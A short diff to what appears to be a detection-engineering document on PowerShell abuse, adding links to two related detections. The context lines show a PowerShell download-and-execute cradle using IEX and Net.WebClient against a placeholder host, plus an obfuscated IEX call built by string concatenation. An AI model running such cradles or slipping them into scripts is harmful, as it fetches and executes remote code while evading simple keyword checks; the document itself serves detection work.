@@ -285,3 +285,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://example.com')
 $cmd="I"+"EX"; &($cmd) "Write-Output 'Test'"
 ```
 
+## Related Detections
+
+- Detection 01 — PowerShell Execution Detection  
+- Detection 02 — PowerShell Script Block Logging  
